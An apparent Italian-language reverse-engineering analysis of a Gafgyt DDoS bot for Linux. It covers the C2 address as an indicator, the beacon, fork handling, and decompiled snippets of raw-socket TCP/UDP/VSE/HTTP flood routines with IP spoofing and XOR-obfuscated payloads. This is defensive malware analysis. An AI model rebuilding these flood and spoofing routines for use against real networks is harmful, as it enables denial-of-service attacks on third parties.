<p class="title">--- nota metodologica ---</p>
;l'analisi dei disassemblati e dei decompilati e' stata condotta interamente a mano, includendo il mapping e la rinomina delle variabili, la ricostruzione del flusso di controllo e l'identificazione delle strutture dati. L'intelligenza artificiale e' stata utilizzata esclusivamente nella fase finale del lavoro, come supportoi all'analisi: per validare alcune ipotesi interpretative, per effettuare una revisione degli errori sul materiale gia' analizzato e in parte per la stesura del presente documento. Nessuna parte dell'analisi tecnica e' stata delegata o generata automaticamente. 

<p class="title">--- vespa crabro ---</p>

;il calabrone (Vespa crabro) e' il vespide piu' grande presente in Europa, capace di raggiungere i 35 millimetri di lunghezza. Vive in colonie organizzate intorno a un nido centrale, dal quale le operaie si disperdono autonomamente nel territorio seguendo segnali chimici condivisi. Quando il nido viene percepito come minacciato, piu' individui reagiscono simultaneamente e in modo coordinato, producendo un effetto di attacco collettivo che appare sincronizzato pur nascendo da impulsi distribuiti. Ogni individuo e' perfettamente funzionale in autonomia, ma il danno reale emerge dalla sovrapposizione di piu' azioni parallele sullo stesso bersaglio. Il calabrone e' inoltre noto per la capacita' di colpire bersagli specifici con precisione, e per la persistenza: non abbandona il bersaglio fino al termine della minaccia percepita o allo scadere della risposta biologica che ne ha innescato il comportamento.

;music/mashup by Bz Akira Santjago/HCF: <a href="https://bzakirasantjago.blogspot.com/2026/05/the-wasp-bz-akira-santjago.html" target="_blank" rel="noopener noreferrer">The Wasp</a>

<p class="title">=== EXECUTIVE SUMMARY ===</p>

;Gafgyt e' un bot DDoS per Linux (ELF x86-64) con architettura Command & Control classica. Il binario si connette a un server remoto, si autentica con un beacon iniziale contenente informazioni sull'host infetto, e attende comandi per lanciare attacchi di tipo flood verso target arbitrari.

;supporta cinque vettori di attacco (TCP, UDP, VSE, HTTPSTOMP, STDHEX), con capacita' di IP spoofing tramite socket raw e costruzione manuale dei pacchetti.

;IoC identificato: server C2 all'indirizzo 5.2.65.150:999.

;per struttura, vettori di attacco e pattern implementativi, il campione e' compatibile con la famiglia Gafgyt e i suoi derivati.

<p class="title">=== PROTOCOLLO C2 ===</p>

<p class="title">--- connessione ---</p>

;la funzione initConnection() gestisce la connessione al C2. Itera su un array globale commServer[] di stringhe nel formato "host:porta", selezionando il server corrente tramite l'indice globale currentServer. Il parsing dell'indirizzo avviene con tre chiamate successive a strchr(':'):

;reversing della funzione: <a href="https://spaghetti-hacker.github.io/init_connection.html" target="_blank" rel="noopener noreferrer">initConnection()</a>

@@@
commServer[] -> "5.2.65.150:999"   ;unico C2 identificato nel binario

[0x00403af9]
mov rax, qword [rax*8 + obj.commServer]
@@@

;commServer[currentServer] -> "5.2.65.150:999"
;array di puntatori a stringa, *8 byte (puntatori 64-bit)
 
@@@
strchr(dest, ':')   ;verifica esistenza separatore.
atoi(ptr + 1)       ;legge la porta come intero.
*ptr = '\0'         ;tronca la stringa sull'host.
@@@

;il parsing dell'indirizzo avviene con tre chiamate successive a strchr(':').

@@@
mov ecx, 0x1e       ;30 secondi
call sym.connectTimeout
@@@

;il tentativo di connessione ha un timeout di 30 secondi.

;la prima chiamata strchr verifica la presenza del separatore, la seconda legge la porta con atoi(), la terza tronca la stringa scrivendo '\0' sul carattere ':'. Il tentativo di connessione ha un timeout di 30 secondi (connectTimeout). In caso di fallimento, il chiamante ripete la chiamata incrementando currentServer, realizzando cosi' un meccanismo di failover.

;porta di default hardcoded: 0x1b46 (6982). La porta del C2 effettiva e' 999.

<p class="title">--- beacon iniziale ---</p>

;dopo la connessione, il bot trasmette:

;IP locale (ottenuto tramite getOurIP).
;architettura CPU (getArch, es. "x86_64").
;porta rilevante sull'host (getPortz).

;getPortz() verifica tramite access() la presenza di /usr/bin/python, /usr/bin/python3, /usr/bin/perl, /usr/sbin/telnetd. Il risultato informa il C2 sulle capability di esecuzione script e presenza server telnetd.

;il valore "22" non rappresenta una porta ma un indicatore di capability trasmesso al C2 nel beacon. La presenza di telnetd e' significativa perche' segnala che il dispositivo infetto si trova probabilmente in un segmento di rete popolato da altri dispositivi IoT con telnet esposto e magari credenziali di default. Coerente con meccanismi di propagazione osservati in varianti Gafgyt/Mirai. O magari gli autori erano già a conoscenza dell'RCE in telnetd (Vulnerabilità Critica <a href="https://www.youtube.com/watch?v=sbhqPynPP5Q" target="_blank" rel="noopener noreferrer">CVE-2026-24061</a>).

@@@
mov rdi, "/usr/bin/python"
call sym.access
mov rdi, "/usr/bin/python3"
call sym.access
mov rdi, "/usr/bin/perl"
call sym.access
mov rdi, "/usr/sbin/telnetd"
call sym.access
@@@

;se il bot ha infettato un dispositivo che esegue telnetd, significa che si trova probabilmente in un segmento di rete popolato da altri dispositivi magari simili.
;il risultato viene trasmesso al C2 nel beacon come indicatore di capability.

<p class="title">=== GESTIONE DEI PROCESSI FIGLI ===</p>

;ogni attacco viene eseguito in un processo figlio separato, tramite listFork(), wrapper attorno a fork() che mantiene aggiornato l'array globale pids[].

;reversing della funzione: <a href="https://spaghetti-hacker.github.io/list_fork.html" target="_blank" rel="noopener noreferrer">listFork()</a> 

;osservazione:

;malloc non verificata.
;fork(-1) non gestita.
;stato globale fragile.

@@@
__pid_t listFork(void) {
       __pid_t pid_fork;
       void *puntatore_nuova_memoria;
       uint i;

       pid_fork = fork();
       if (pid_fork != 0) {
           numpids = numpids + 1;
           puntatore_nuova_memoria = malloc(numpids * 4 + 4);
           for (i = 0; (ulong)i < numpids - 1U; i = i + 1) {
               *(int *)((ulong)i * 4 + (long)puntatore_nuova_memoria) =
                   *(int *)((ulong)i * 4 + (long)pids);
           }
           ;copia elementi preesistenti nel nuovo buffer.
           *(__pid_t *)((long)puntatore_nuova_memoria + numpids * 4 - 4) = pid_fork;
           ;accoda il pid del nuovo figlio nell'ultimo slot.
           free(pids);
           pids = puntatore_nuova_memoria;
       }
       return pid_fork;
       ;ritorna pid al padre, 0 al figlio: semantica identica a fork().
   }
@@@

;ad ogni chiamata nel ramo padre:

;numpids viene incrementato.
;viene allocato un nuovo buffer di dimensione (numpids * 4) + 4 byte.
;gli elementi preesistenti vengono copiati nel nuovo buffer.
;il pid del nuovo figlio viene accodato.
;il vecchio buffer viene liberato con free().
;obj.pids viene aggiornato al nuovo puntatore.

;il figlio bypassa completamente questa logica e ritorna 0, replicando la semantica standard di fork(). L'effetto collaterale e' trasparente al chiamante: il padre riceve il pid del figlio, il figlio riceve 0, esattamente come con una fork diretta.

@@@
mov edx, 1              ;WNOHANG
call sym.waitpid
test eax, eax
jle <skip>              ;figlio ancora vivo o errore
mov dword [rcx], eax    ;pids[i-1] = pids[i]  <- shift left
mov dword [rax], 0      ;pids[numpids-1] = 0
dec rax                 ;numpids--
call sym.malloc         ;realloc manuale: (numpids+1)*4
call sym.free           ;libera vecchio array
@@@

;il garbage collector nel loop principale esegue waitpid(WNOHANG) su tutti i pid in pids[]. Per ogni figlio terminato, l'array viene compattato con uno shift-left e ridimensionato tramite una nuova coppia malloc/free.

@@@
pcVar10 = strchr(pcVar1, 0x2c);   
;cerca ',' nel target
   if (pcVar10 == NULL) {
       iVar7 = listFork();
       ;target singolo: un solo figlio.
   } else {
       local_c8 = strtok(pcVar1, ",");
       while (local_c8 != NULL) {
           iVar7 = listFork();
           ;un figlio per ogni token.
           local_c8 = strtok(NULL, ",");
       }
   }
@@@

;se il target e' una lista di indirizzi separati da virgola, viene creato un processo figlio separato per ciascun target tramite strtok(",").

<p class="title">=== VETTORI DI ATTACCO ===</p>

<p class="title">--- TCP flood con IP spoofing (ftcp) ---</p>

;reversing della funzione: <a href="https://spaghetti-hacker.github.io/ftcp.html" target="_blank" rel="noopener noreferrer">ftcp()</a>

@@@
ftcp(host, porta, durata, cidr_prefix, flag_tcp, payload_size, pck_per_burst)
@@@

;firma:

@@@
fd = socket(2, 3, 6)         ;AF_INET, SOCK_RAW, IPPROTO_TCP
optval = 1
setsockopt(fd, 0, 3, &optval, 4)
@@@

;IP_HDRINCL: il programma costruisce l'header IP manualmente.
;costruisce pacchetti IP/TCP raw con IP_HDRINCL, randomizzando l'IP sorgente ad ogni iterazione entro la subnet definita dal prefisso CIDR. 
;la netmask viene calcolata come:

@@@
netmask = -(1 << (32 - cidr_prefix))
@@@

;es. cidr_prefix=24 -> 0xFFFFFF00 (/24).
;es. cidr_prefix=0  -> netmask=0, IP random su tutto lo spazio IPv4.
;se cidr_prefix e' 0, gli IP sorgente vengono generati su tutto lo spazio IPv4.
;i flag TCP vengono configurati tramite parsing di una stringa separata da virgole. I valori supportati sono: "syn", "rst", "fin", "ack", "psh", "all". Il confronto avviene tramite repe cmpsb inline (equivalente a strncmp). Il valore "all" attiva simultaneamente SYN|RST|FIN|ACK|PSH.

@@@
mov qword [var_d8h], 0x40baca    ;"syn"
mov qword [var_f0h], 0x40bace    ;"rst"
mov qword [var_108h], 0x40bad2   ;"fin"
mov qword [var_120h], 0x40bad6   ;"ack"
mov qword [var_138h], 0x40bada   ;"psh"
mov qword [var_c0h], 0x40bac4    ;"all"
repe cmpsb byte [rsi], byte [rdi]
@@@

;confronto inline equivalente a strncmp, evita chiamata a funzione.

@@@
or edx, 2    ;SYN
or edx, 4    ;RST
or edx, 1    ;FIN
or edx, 0x10 ;ACK
or edx, 8    ;PSH
@@@

;"all" attiva tutti i flag contemporaneamente
;ad ogni iterazione del loop di flood vengono rerandomizzati:
;IP sorgente (offset 0xc dell'header IP).
;IP identification (offset 0x4).
;sequence number TCP (offset 0x4 dell'header TCP).

@@@
call sym.getRandomIP         ;nuovo IP sorgente nella subnet CIDR
mov dword [rax + 0xc], edx   ;offset 0xc header IP = src_addr
call sym.rand_cmwc
mov word [rax + 4], dx       ;offset 0x4 header IP = identification
call sym.rand_cmwc
mov dword [tcp_header + 4]   ;sequence number TCP
call sym.tcpcsum             ;ricalcolo checksum TCP
call sym.csum                ;ricalcolo checksum IP
@@@

;dopo ogni modifica vengono ricalcolati i checksum TCP (tcpcsum) e IP (csum). Il loop interno conta i pacchetti per burst, quello esterno controlla la scadenza tramite time().

<p class="title">--- UDP flood con IP spoofing (SendUDP) ---</p>

@@@
SendUDP(target_ip, dst_port, duration_sec, payload_size, pkt_count, cidr_prefix)
@@@

;firma.
;funzionalmente analoga a ftcp ma per il protocollo UDP. Apre una raw socket (AF_INET/SOCK_RAW/IPPROTO_UDP) con IP_HDRINCL e costruisce manualmente header IP e header UDP. La netmask CIDR e il calcolo dell'IP sorgente seguono lo stesso schema di ftcp.
;una differenza rilevante rispetto agli altri vettori e' l'inizializzazione del PRNG: prima del loop di flood, SendUDP esegue 50 iterazioni che mescolano rand_cmwc(), time(), srandom(), rand() e init_rand(), con l'obiettivo esplicito di massimizzare l'entropia degli IP sorgente generati.

@@@
local_38 = 0x32;    
;50 iterazioni
   while (true) {
       local_38--;
       if (local_38 == -1) break;
       tVar11 = time(NULL);
       uVar8 = rand_cmwc();
       srandom(uVar8^(uint)tVar11);
       iVar7 = rand();
       init_rand(iVar7);
   }
@@@

;mixing aggressivo: rand_cmwc^time -> srandom -> rand -> init_rand.
;obiettivo: massimizzare l'imprevedibilita' degli IP sorgente spoofati.

@@@
udp_header[0] = rand_cmwc()              ;src_port: random
udp_header[1] = htons(dst_port)          ;dst_port: fisso o random
udp_header[2] = htons(payload_size + 8)  ;length
udp_header[3] = 0   
@@@

;header UDP prodotto (nessun checksum).  
;ad ogni pacchetto inviato vengono rerandomizzati:
;IP sorgente (getRandomIP con netmask CIDR).
;IP identification (offset 0x4 header IP).
;porta sorgente UDP.
;porta destinazione UDP (solo se dst_port == 0).
;il checksum IP viene ricalcolato ad ogni iterazione. Il payload viene generato una sola volta prima del loop tramite makeRandomStr() e non cambia tra un pacchetto e l'altro. La struttura a doppio loop gestisce burst di pkt_count pacchetti ripetuti fino allo scadere di duration_sec secondi.
;l'assenza del checksum UDP e' intenzionale: su IPv4 il checksum UDP e' opzionale (RFC 768) e il kernel accetta pacchetti con checksum zero.

<p class="title">--- VSE flood (vseattack) ---</p>

@@@
vseattack(addr, porta, durata, dimensione_pck, dimensione, pck_totali, limite_blocco_pck, millisecondi_di_pausa)
@@@

;firma.
;VSE: sta per Valve Source Engine. Il flood imita le query A2S_INFO del protocollo di Valve, usate per richiedere informazioni ai server di giochi come CS e TF2. Il payload hardcoded e' "TSource Engine Query" seguito da dati randomici.

@@@
payload = "TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65..."
@@@

;stringa A2S_INFO hardcoded seguita da junk randomico.
;la funzione seleziona due modalita' operative in base al parametro dimensione_pck/size_locale:

@@@
if (size_locale == 0x20) {
     fd = socket(2, 2, 0x11);    
     ;AF_INET, SOCK_DGRAM, IPPROTO_UDP
     ;modalita' 1: UDP standard, nessun IP spoofing.
 } else {
     fd2 = socket(2, 3, 0x11);   
     ;AF_INET, SOCK_RAW, IPPROTO_UDP
     setsockopt(fd2, 0, 3, &opt, 4);
     ;modalita' 2: raw socket con IP_HDRINCL, IP spoofing abilitato.
 }
@@@

;il rate limiting nel loop e' implementato tramite usleep:
 
@@@
if (limite_blocco_pck == idx) {
    usleep(millisecondi_di_pausa * 1000);
    ;pausa ogni N pacchetti per non saturare la banda locale.
    idx = 0;
}
@@@

;modalità 1 (dimensione_pck == 0x20): SOCK_DGRAM
;socket UDP standard.
;payload randomico allocato su heap.
;porta di destinazione randomica se porta == 0.
;modalità 2 (dimensione_pck != 0x20): SOCK_RAW con IP_HDRINCL
;costruzione manuale dell'header IP+UDP.
;IP spoofing tramite getRandomIP() con netmask calcolata da dimensione_pck.
;rerandomizzazione ad ogni iterazione di: IP sorgente, porta sorgente, IP identification.
;ricalcolo checksum IP (csum) ad ogni pacchetto.
;il rate limiting e' implementato tramite usleep(millisecondi_di_pausa * 1000) ogni limite_blocco_pck pacchetti. La terminazione avviene per contatore (pck_totali) o per scadenza temporale (durata secondi).

<p class="title">--- HTTP flood (HTTPSTOMP) ---</p>

;HTTPSTOMP e' l'unico vettore che opera a livello applicativo anziche' di rete: non costruisce pacchetti raw e non usa IP spoofing, ma apre connessioni TCP reali verso il target. Questo lo rende inefficace contro infrastrutture che filtrano il traffico a livello 3, ma particolarmente adatto contro target protetti da CDN dove il flood di rete viene assorbito prima di raggiungere il server.

@@@
SendHTTPHex(comando, domain, proto, param_4, tempo, num_threads)
sendHTTPtwo(comando, domain, proto, param_4, tempo, num_threads)
@@@

;firme.
;le due funzioni vengono chiamate in sequenza dallo stesso processo figlio. 
;SendHTTPHex genera num_threads processi figli tramite un loop di fork() a cascata (non N fork parallele dal padre, ma una catena padre->figlio->nipote). Ogni processo entra in un loop infinito che:

@@@
i = 0;
while (true) {
    if (num_threads <= i) return;
    sprintf(richiesta_get,
        "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n...",
        comando, payload_nameserver, domain, useragents[rand() % 0x24]);
    ;0x24 = 36 User-Agent hardcoded, selezione casuale per eludere filtri
    eax = fork();
    if (eax != 0) break;   ;padre esce dal loop di fork
    i++;
    ;figlio incrementa e forca a sua volta -> catena padre->figlio->nipote
}
@@@

;apre una nuova connessione TCP verso il target (socket_connect).
;invia una richiesta HTTP malformata.

;1460 = MTU Ethernet (1500) - IP header (20) - UDP header (8).
;il payload fisso ha dimensione 1460 byte. Tale valore è inferiore al massimo payload UDP trasportabile in un frame Ethernet standard (1472 byte con MTU 1500), ma evita comunque la frammentazione IP. La dimensione coincide invece con il tipico MSS TCP su Ethernet (1500 - 20 byte IP - 20 byte TCP), suggerendo il possibile riutilizzo di una costante comune in altri moduli o tool di flooding.

;la terminazione bypassa qualunque handler atexit.
;la variante piu' minimale disponibile. Apre un socket UDP standard (AF_INET/SOCK_DGRAM) senza IP_HDRINCL: nessun IP spoofing, nessuna costruzione manuale degli header. La risoluzione del target avviene tramite gethostbyname() (funzione legacy, non thread-safe).

<p class="title">=== ASPETTI TECNICI RILEVANTI ===</p>

<p class="title">--- PRNG predicibile ---</p>

;i due generatori di numeri casuali (libc srand e PRNG custom init_rand) vengono inizializzati con lo stesso seed:

@@@
seed = getpid() ^ time(0)

0x403bd9  mov ebx, eax        ;ebx = time(0)
0x403bdb  call sym.getpid
0x403be0  xor eax, ebx        ;seed = getpid() ^ time(0)
0x403be4  call sym.srand
0x403bfe  call sym.init_rand  ;stesso seed per il PRNG custom
@@@

;l'XOR con il PID aggiunge entropia minima per differenziare istanze concorrenti sullo stesso host, ma il seed rimane predicibile. Un osservatore con visibilita' sul timestamp di avvio del processo puo' ricostruire il seed e predire la sequenza di IP sorgente generati, rendendo il flood tracciabile nonostante lo spoofing.
;SendUDP tenta di mitigare questo limite con 50 iterazioni di mixing aggiuntivo (rand_cmwc ^ time -> srandom -> rand -> init_rand), ma poiche' anche time() e' osservabile, il miglioramento e' marginale. Questo e' un pattern ricorrente nei bot derivati da Mirai, dove la robustezza crittografica non e' una priorita'.

<p class="title">--- Spoofing e costruzione manuale dei pacchetti ---</p>

;ftcp, SendUDP e vseattack (modalita' raw) costruiscono i pacchetti interamente in userspace tramite socket AF_INET/SOCK_RAW con IP_HDRINCL. La sequenza comune e':

@@@
uVar10 = getRandomIP(netmask);
uVar10 = htonl(uVar10);
*(uint32_t *)((long)ip_header + 0xc) = uVar10;   ;src_addr
uVar6 = rand_cmwc();
*(uint16_t *)((long)ip_header + 4) = uVar6;      ;identification
uVar6 = csum(packet_buf, total_length);
*(uint16_t *)((long)ip_header + 10) = uVar6;     ;checksum IP
sendto(fd, packet_buf, packet_size, 0, &dest_addr, 0x10);
;aggiornamento parziale: solo i campi che variano, il resto rimane invariato.
@@@

;makeIPPacket() / makevsepacket(): popola header IP con IP sorgente random
;Compilazione manuale header TCP o UDP (porte, flags, lunghezze)
;makeRandomStr(): riempie il payload
;tcpcsum() / csum(): calcolo checksum
;sendto(): invio grezzo

;ad ogni iterazione del loop vengono aggiornati solo i campi che variano (IP sorgente, porte, sequence number, identification), evitando di ricostruire l'intero pacchetto. I checksum vengono ricalcolati dopo ogni modifica.

;l'unica eccezione e' SendUDP, che non calcola il checksum UDP (campo impostato a 0): comportamento valido su IPv4 per RFC 768, accettato dal kernel ricevente.

@@@
udp_header[3] = 0    ;checksum UDP omesso, valido per RFC 768 su IPv4
@@@

<p class="title">--- Obfuscation del payload HTTP ---</p>

;il payload "NAMESERVER " usato da SendHTTPHex e' conservato in memoria XOR-ato con chiave 0xCA. Si tratta di una tecnica di offuscamento statico minimale.

;decodifica in Python:

;bytes([b ^ 0xCA for b in encoded]) -> b"NAMESERVER " * N
;chiave fissa hardcoded: non varia tra esecuzioni

;non impedisce l'analisi dinamica, ma rende meno immediata l'identificazione del payload con grep o YARA sul binario a riposo. La chiave 0xCA e' hardcoded e non varia tra esecuzioni.

<script>
(function(){
    const raw = document.getElementById('content').textContent;
    const lines = raw.split('\n');
    const output = document.getElementById('output');

    let i = 0;

    // salta righe vuote iniziali
    while(i < lines.length && lines[i].trim() === '') i++;

    // prima riga non vuota = titolo
    const title = lines[i] ? lines[i].trim() : '';
    if(title){
        document.title = title;
    }
    i++;

    // costruisce il contenuto dentro un unico div.article
    // il titolo è il nodo di testo iniziale del box
    let inner = escCode(title);
    i; // già avanzato

    while(i < lines.length){
        const line = lines[i];

        // blocco @@@ → codice pre-wrap
        if(line.trim() === '@@@'){
            i++;
            let block = '';
            while(i < lines.length && lines[i].trim() !== '@@@'){
                block += lines[i] + '\n';
                i++;
            }
            i++; // salta @@@ di chiusura
            // il codice viene escapato tranne &lt; &gt; &amp; già scritti
            //inner += escCode(block.replace(/\n$/, ''));
	    inner += '<pre class="codeblock">' + escCode(block.replace(/\n$/, '')) + '</pre>';
            continue;
        }

        // raccoglie testo fino al prossimo @@@
        let textLines = [];
        while(i < lines.length && lines[i].trim() !== '@@@'){
            textLines.push(lines[i]);
            i++;
        }

        const paragraphs = splitParagraphs(textLines);
        if(paragraphs.length > 0){
	    inner += '<div class="commento">\n';
            for (const p of paragraphs){
                const cleaned = p.replace(/\n/g, '<br>');
                inner += '<p>' + cleaned + '</p>\n';
                }
            inner += '</div>';
        }
    }

    output.innerHTML = '<div class="article">' + inner + '</div>';

    // escapa solo il testo codice (non i commenti che possono avere HTML)
    function escCode(str){
        return str
            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    function splitParagraphs(lines){
        const result = [];
        let current = [];
        for(const line of lines){
            if(line.trim() === ''){
                if(current.length > 0){
                    result.push(current.join('\n'));
                    current = [];
                }
            } else {
                current.push(line);
            }
        }
        if(current.length > 0) result.push(current.join('\n'));
        return result;
    }
})();
